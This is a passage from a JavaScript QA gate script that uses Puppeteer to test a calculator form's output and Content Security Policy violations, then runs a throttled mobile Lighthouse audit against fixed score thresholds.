    // — dejaba "1800"+"5000" = 18005000 y la asercion leia un numero enorme que
    // en realidad era CORRECTO. Poner value="" no dispara `input`, pero el
    // page.type de la linea siguiente si, asi que el ultimo recalculo ve 5000.
    await page.$eval("#recibo", (el) => {
      el.value = "";
    });
    await page.type("#recibo", "5000");
    await wait(80);
    const after = await out();
    const condAfter = await cond();
    return {
      pass:
        born === "1296" && condBorn === "none" && // 1800 no pasa el umbral
        after === "3600" && condAfter !== "none", // 5000 * 0.72, y revela el bloque
      detail: `alMontar(out=${born},if=${condBorn}) tras teclear 5000(out=${after},if=${condAfter})`,
    };
  });

  // Assertion 1 (the titular one) is evaluated LAST, over everything the
  // interactions above triggered — a hash-drift bug would surface here
  // as a browser-generated console error regardless of which behavior it
  // broke.
  record(
    1,
    "CERO violaciones de CSP en consola (titular)",
    cspViolations.length === 0,
    cspViolations.length ? `${cspViolations.length} violation(s): ${cspViolations.slice(0, 3).join(" | ")}` : "clean",
  );

  await ctx.close();

  // ── Lighthouse: same thresholds/config as scripts/qa/3d-born100-gate.mjs ──
  const cdpPort = Number(new URL(browser.wsEndpoint()).port);
  const lhResult = await lighthouse(origin + "/", {
    port: cdpPort,
    output: "json",
    logLevel: "error",
    formFactor: "mobile",
    screenEmulation: { mobile: true, width: 412, height: 823, deviceScaleFactor: 1.75, disabled: false },
    throttling: {
      rttMs: 150,
      throughputKbps: 1638.4,
      cpuSlowdownMultiplier: 4,
      requestLatencyMs: 562.5,
      downloadThroughputKbps: 1474.56,
      uploadThroughputKbps: 675,
    },
    throttlingMethod: "simulate",
    onlyCategories: ["performance", "accessibility", "best-practices", "seo"],
  });

  await browser.close();
  server.close();

  const { lhr } = lhResult;
  const score = (c) => Math.round((lhr.categories[c]?.score ?? 0) * 100);
  lhResults = {
    performance: score("performance"),
    accessibility: score("accessibility"),
    bestPractices: score("best-practices"),
    seo: score("seo"),
    lcpMs: Math.round(lhr.audits["largest-contentful-paint"]?.numericValue ?? 1e9),
    tbtMs: Math.round(lhr.audits["total-blocking-time"]?.numericValue ?? 1e9),
  };

  console.log("\nLighthouse results (mobile, throttled — same config as 3d:gate):");
  console.log(JSON.stringify(lhResults, null, 2));
  console.log(
    `Thresholds used (cited from scripts/qa/3d-born100-gate.mjs): performance>=${LH_THRESHOLDS.performance}, ` +
      `accessibility=${LH_THRESHOLDS.accessibility}, best-practices=${LH_THRESHOLDS.bestPractices}, seo=${LH_THRESHOLDS.seo}, ` +
      `LCP<=${LH_THRESHOLDS.lcpMs}ms, TBT<=${LH_THRESHOLDS.tbtMs}ms`,
  );

  if (lhResults.performance < LH_THRESHOLDS.performance) lhFail.push(`performance ${lhResults.performance} < ${LH_THRESHOLDS.performance}`);
  if (lhResults.accessibility < LH_THRESHOLDS.accessibility) lhFail.push(`accessibility ${lhResults.accessibility} < ${LH_THRESHOLDS.accessibility}`);
  if (lhResults.bestPractices < LH_THRESHOLDS.bestPractices) lhFail.push(`best-practices ${lhResults.bestPractices} < ${LH_THRESHOLDS.bestPractices}`);
  if (lhResults.seo < LH_THRESHOLDS.seo) lhFail.push(`seo ${lhResults.seo} < ${LH_THRESHOLDS.seo}`);
  if (lhResults.lcpMs > LH_THRESHOLDS.lcpMs) lhFail.push(`LCP ${lhResults.lcpMs}ms > ${LH_THRESHOLDS.lcpMs}`);
  if (lhResults.tbtMs > LH_THRESHOLDS.tbtMs) lhFail.push(`TBT ${lhResults.tbtMs}ms > ${LH_THRESHOLDS.tbtMs}`);
} catch (err) {
  const msg = err?.message ?? String(err);
  const isChromeMissing =
    /Could not find Chrome|No usable sandbox|chrome not found|executable|protocol error|ECONNREFUSED|spawn/i.test(msg);
  server.close();
  if (isChromeMissing) {
    console.error("\nChrome unavailable:\n  " + msg.slice(0, 300));
    console.error(
      "\nGATE NOT SATISFIED — Chrome is required (browser truth is the entire point of Task 14; there is no " +
        "static-only fallback here). Set PUPPETEER_EXECUTABLE_PATH if Chrome is installed in a non-default location.",
    );
    process.exit(1);
  }
  // Unexpected error — surface it as a real failure, don't swallow it.
  throw err;
}

// ── Final verdict ─────────────────────────────────────────────────────────
const functionalFail = results.filter((r) => !r.pass).map((r) => `${r.n}. ${r.name} — ${r.detail}`);
const allFail = [...staticFail, ...functionalFail, ...lhFail];

if (allFail.length) {
  console.error("\nGATE FAILED:\n - " + allFail.join("\n - "));
  process.exit(1);
}

console.log("\nGATE PASSED");
